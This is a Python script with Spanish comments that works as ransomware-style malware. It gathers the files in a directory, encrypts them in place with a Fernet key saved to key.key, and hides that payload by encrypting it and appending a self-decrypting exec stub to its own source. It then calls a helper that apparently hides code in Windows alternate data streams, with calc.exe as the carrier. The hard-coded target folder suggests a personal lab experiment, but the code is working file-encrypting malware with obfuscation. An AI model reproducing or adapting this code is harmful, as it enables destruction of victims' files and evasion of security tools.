#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
import subprocess
import signal
from termcolor import colored
import allfiles1
import sys
# Crl C
def def_handler(sig, frame):
    print(colored (f"\n[!] Saliendo...\n"))
    sys.exit(1)


def c_e(code, key):
    fernet = Fernet(key)
    encrypted_code = fernet.encrypt(code.encode())
    return encrypted_code


def d_e(encrypted_code, key):
    fernet = Fernet(key)
    decrypted_code = fernet.decrypt(encrypted_code).decode()
    return decrypted_code



def gen_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)



def return_key():
    return open('key.key', 'rb').read()



def file_encrypt(files, key):
    fernet = Fernet(key)
    for filepath in files:
        with open(filepath, "rb") as file:
            data_to_encrypt = file.read()
        data = fernet.encrypt(data_to_encrypt)

        # Guardar el archivo cifrado
        with open(filepath, "wb") as file:
            file.write(data)

def self_modifying_code(keycode):
    new_code = """
encrypted_code = b'{encrypted_code}'
exec(d_e(encrypted_code, b'{key}'))
"""

    code_to_add = r'''
def file_encrypt(files, key):
    fernet = Fernet(key)
    for filepath in files:  
        with open(filepath, "rb") as file:  
            data_to_encrypt = file.read()
        data = fernet.encrypt(data_to_encrypt)

        with open(filepath, "wb") as file:  
            file.write(data)


base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
allfiles1.searching_files(base_directory)
files = allfiles1.file_list

gen_key()
key = return_key()
file_encrypt(files, key)
'''

    encrypted_code = c_e(code_to_add, keycode).decode()
    formatted_code = new_code.format(encrypted_code=encrypted_code, key=keycode.decode())

    current_file = __file__
    with open(current_file, 'a') as f:
        f.write(formatted_code)

def main():
    keycode = Fernet.generate_key()
    self_modifying_code(keycode)
    subprocess.run(["python3", "ads_file.py", r"C:\Windows\system32\calc.exe", "-a", "art.py", "-o"])

if __name__ == '__main__':
    main()